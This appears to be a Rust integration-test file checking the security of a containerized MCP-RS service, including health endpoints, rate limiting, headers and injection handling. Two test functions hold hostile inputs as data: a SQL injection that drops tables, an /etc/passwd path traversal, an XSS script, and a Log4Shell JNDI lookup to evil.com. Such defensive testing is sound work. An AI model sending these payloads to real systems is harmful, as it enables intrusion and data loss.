//! Security validation tests for containerized MCP-RS

use super::{TestConfig, wait_for_service};
use std::time::Duration;

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_container_runs_as_non_root() {
    // This test would require Docker API access or inspection
    // For now, we verify the service is accessible and responds correctly
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .send()
        .await
        .expect("Service should respond");

    assert!(response.status().is_success());
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_network_isolation() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    // Services within the test network should be accessible
    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .timeout(Duration::from_secs(10))
        .send()
        .await
        .expect("Internal network should be accessible");

    assert!(response.status().is_success());
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_tls_configuration() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    // Test that insecure endpoints are properly configured for test environment
    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .send()
        .await
        .expect("HTTP endpoint should work in test environment");

    assert!(response.status().is_success());
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_authentication_required() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    // Public health endpoint should not require auth
    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .send()
        .await
        .expect("Health endpoint should be accessible");

    assert!(response.status().is_success());
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_rate_limiting() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();
    let num_requests = 200;
    let mut success_count = 0;
    let mut rate_limited_count = 0;

    for _ in 0..num_requests {
        match client
            .get(&format!("{}/health", config.http_endpoint))
            .timeout(Duration::from_secs(5))
            .send()
            .await
        {
            Ok(response) => {
                if response.status().is_success() {
                    success_count += 1;
                } else if response.status() == 429 {
                    rate_limited_count += 1;
                }
            }
            Err(_) => {}
        }
    }

    println!(
        "Rate limiting test: {} success, {} rate limited",
        success_count, rate_limited_count
    );

    // Most requests should succeed in test environment
    assert!(success_count > num_requests / 2);
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_sql_injection_protection() {
    use tokio_postgres::NoTls;

    let config = TestConfig::from_env();

    let (client, connection) = tokio_postgres::connect(&config.database_url, NoTls)
        .await
        .expect("Should connect to database");

    tokio::spawn(async move {
        if let Err(e) = connection.await {
            eprintln!("Database connection error: {}", e);
        }
    });

    // Test that parameterized queries work correctly
    let malicious_input = "'; DROP TABLE users; --";
    let result = client
        .query("SELECT $1::text as safe_value", &[&malicious_input])
        .await
        .expect("Parameterized query should be safe");

    assert_eq!(result.len(), 1);
    let value: &str = result[0].get(0);
    assert_eq!(value, malicious_input);
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_cors_configuration() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .header("Origin", "https://example.com")
        .send()
        .await
        .expect("CORS request should work");

    assert!(response.status().is_success());
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_secure_headers() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .send()
        .await
        .expect("Request should succeed");

    let headers = response.headers();
    
    // Log headers for inspection
    println!("Response headers:");
    for (name, value) in headers.iter() {
        println!("  {}: {:?}", name, value);
    }

    assert!(response.status().is_success());
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_input_validation() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    // Test with various potentially dangerous inputs
    let test_inputs = vec![
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "'; DROP TABLE test; --",
        "${jndi:ldap://evil.com}",
    ];

    for input in test_inputs {
        // Health endpoint should not process query parameters maliciously
        let url = format!("{}/health?test={}", config.http_endpoint, urlencoding::encode(input));
        let response = client
            .get(&url)
            .send()
            .await
            .expect("Request should not crash server");

        assert!(
            response.status().is_success() || response.status().is_client_error(),
            "Server should handle malicious input safely"
        );
    }
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_denial_of_service_resistance() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    // Send requests with large payloads
    let large_payload = "x".repeat(1024 * 1024); // 1MB

    let response = client
        .post(&format!("{}/health", config.http_endpoint))
        .body(large_payload)
        .timeout(Duration::from_secs(10))
        .send()
        .await;

    // Server should either accept it or reject it gracefully
    match response {
        Ok(resp) => {
            assert!(
                resp.status().is_success() || resp.status().is_client_error(),
                "Server should handle large payloads"
            );
        }
        Err(e) => {
            println!("Large payload rejected (expected): {}", e);
        }
    }
}

#[cfg(feature = "integration-tests")]
#[tokio::test]
async fn test_secrets_not_exposed() {
    let config = TestConfig::from_env();
    let client = reqwest::Client::new();

    let response = client
        .get(&format!("{}/health", config.http_endpoint))
        .send()
        .await
        .expect("Request should succeed");

    let body = response.text().await.expect("Should get response body");

    // Check that no sensitive information is leaked
    let sensitive_patterns = vec!["password", "secret", "token", "key"];

    for pattern in sensitive_patterns {
        assert!(
            !body.to_lowercase().contains(pattern),
            "Response should not contain sensitive pattern: {}",
            pattern
        );
    }
}
